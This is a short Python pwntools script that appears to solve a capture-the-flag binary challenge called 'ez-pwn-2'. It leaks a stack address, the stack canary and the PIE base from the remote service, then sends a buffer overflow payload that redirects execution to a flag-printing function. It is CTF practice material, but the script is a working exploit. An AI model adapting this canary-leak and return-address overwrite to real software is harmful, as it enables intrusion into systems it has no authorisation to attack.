#!/usr/bin/env python3


from pwn import *


def leaker(leak):
    j = 0
    val = ""
    for i in range(len(hex(leak)),0,-2):
        val+= hex(leak)[i:i+2]
        j+=1
        if(j ==8):
            break
    return val


def reader(leak):
    val = ""
    for i in range(len(leak),0,-2):
        val +=str(leak)[i:i+2]
    val = int(val,16)
    return val

e = ELF("./ez-pwn-2")
r = remote("pwn.bbctf.fluxus.co.in",4002)
r.recvuntil(b"You are here: ")
stack_leak = int(r.recvline().strip(),16)
val = leaker(stack_leak+ 0x18)
r.send(val)
r.recvline()
r.recvline()
canary = r.recvline().strip()
canary = reader(canary)
val = leaker(stack_leak + 0x48)
r.send(val)
r.recvuntil(b"Give me an address and I will grant you 8 leaked bytes:\n")
r.recvline()
pie_leak = r.recvline().strip()
pie_base = reader(pie_leak) - e.sym.main
exploit = val.encode() + b"0" * 12 + p64(canary) + p64(0)  + p64(pie_base + e.sym.this_function_literally_prints_the_flag) 
r.send(exploit)
r.interactive()
